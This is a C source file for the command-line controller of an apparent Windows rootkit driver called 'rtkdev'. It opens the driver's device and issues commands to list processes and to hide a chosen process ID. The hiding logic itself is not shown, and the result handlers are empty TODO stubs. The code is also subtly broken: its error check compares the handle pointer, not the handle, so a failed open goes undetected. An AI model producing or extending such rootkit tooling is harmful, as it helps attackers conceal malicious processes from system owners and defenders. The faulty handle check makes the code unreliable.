#include <windows.h>
#include <stdio.h>

#include "cmd.h"
#include "rtk.h"
#include "..\driver\datadef.h"

const LPCTSTR driverName = "rtkdev";

void main(int argc, char* argv[])
{
	if(1==argc)
	{
		PrintHelp();
		return;
	}

	HANDLE hDevice;
	if(OpenDevice(driverName, &hDevice))
	{
		PROCESS_INFO* buffer = NULL;
		int bufferSize = 0;
		DWORD bytesRead = 0;

		if( 3==argc && strcmp("-pl", argv[1])==0 && atoi(argv[2])!=0 )
		{
			bufferSize = atoi(argv[2]);
			buffer = (PROCESS_INFO *)calloc(bufferSize, sizeof(PROCESS_INFO));

			if(ListProc(hDevice, buffer, bufferSize, &bytesRead))
			{
				// TODO: list processes
			}
		}
		else if( 3==argc && strcmp("-ph", argv[1])==0 && atoi(argv[2])!=0 )
		{
			DWORD pid = atoi(argv[2]);

			if(HideProc(hDevice, pid))
			{
				// TODO: hide process
			}
		}
		else
			PrintHelp();

		CloseHandle(hDevice);
	}
}

void PrintHelp()
{
	printf("Usage:\n");
	printf(" -pl quantity\n");
	printf(" -ph pid\n");
}

BOOL OpenDevice(IN LPCTSTR strDriverName, HANDLE* hDevice)
{
    TCHAR fullDeviceName[64];
	wsprintf(fullDeviceName, TEXT("\\\\.\\%s"), strDriverName);

    *hDevice = CreateFile(
		fullDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

    if(INVALID_HANDLE_VALUE == hDevice)
	{
		printf("unable to open device. error %i occured\n", GetLastError());
        return FALSE;
	}

    return TRUE;
}
